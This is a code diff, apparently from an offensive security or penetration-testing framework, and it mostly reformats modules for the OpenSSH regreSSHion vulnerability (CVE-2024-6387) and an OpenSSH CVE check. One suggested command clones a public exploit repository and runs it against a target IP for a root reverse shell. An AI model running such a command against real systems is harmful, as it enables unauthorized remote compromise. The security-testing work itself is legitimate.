@@ -89,6 +89,7 @@ else:
     print("No default credentials found")
 """
 
+
 class RegreSSHion(AttackModule):
     name = "RegreSSHion"
     description = "OpenSSH regreSSHion RCE (CVE-2024-6387)"
@@ -98,10 +99,26 @@ class RegreSSHion(AttackModule):
     # Phase 3: version-gated -- vulnerable band is < 4.4p1 OR 8.5p1 <= v < 9.8p1.
     target_versions = {
         "ssh": [
-            "openssh_1.", "openssh_2.", "openssh_3.", "openssh_4.0", "openssh_4.1",
-            "openssh_4.2", "openssh_4.3", "openssh_8.5", "openssh_8.6", "openssh_8.7",
-            "openssh_8.8", "openssh_8.9", "openssh_9.0", "openssh_9.1", "openssh_9.2",
-            "openssh_9.3", "openssh_9.4", "openssh_9.5", "openssh_9.6", "openssh_9.7",
+            "openssh_1.",
+            "openssh_2.",
+            "openssh_3.",
+            "openssh_4.0",
+            "openssh_4.1",
+            "openssh_4.2",
+            "openssh_4.3",
+            "openssh_8.5",
+            "openssh_8.6",
+            "openssh_8.7",
+            "openssh_8.8",
+            "openssh_8.9",
+            "openssh_9.0",
+            "openssh_9.1",
+            "openssh_9.2",
+            "openssh_9.3",
+            "openssh_9.4",
+            "openssh_9.5",
+            "openssh_9.6",
+            "openssh_9.7",
         ],
     }
     # Capability metadata: regreSSHion version check (detection only).
@@ -128,12 +145,12 @@ class RegreSSHion(AttackModule):
                 "https://github.com/qualys/regresshion",
             ],
             suggested_command=(
-                f"git_clone(url='https://github.com/qualys/regresshion') && "
-                f"python3 regresshion.py {ctx.target_ip} 22"
+                f"git_clone(url='https://github.com/qualys/regresshion') && python3 regresshion.py {ctx.target_ip} 22"
             ),
             shell_type="reverse",
             privilege_level="root",
         )
+
 
 class OpenSSHCVECheck(AttackModule):
     name = "OpenSSHCVECheck"
@@ -176,6 +193,7 @@ class OpenSSHCVECheck(AttackModule):
     @staticmethod
     def _map_version_to_cves(version: str) -> list[dict[str, str]]:
         import re
+
         cves = []
         if not version:
             return cves
@@ -223,4 +241,3 @@ class OpenSSHCVECheck(AttackModule):
 # ---------------------------------------------------------------------------
 # SMB Modules
 # ---------------------------------------------------------------------------
-
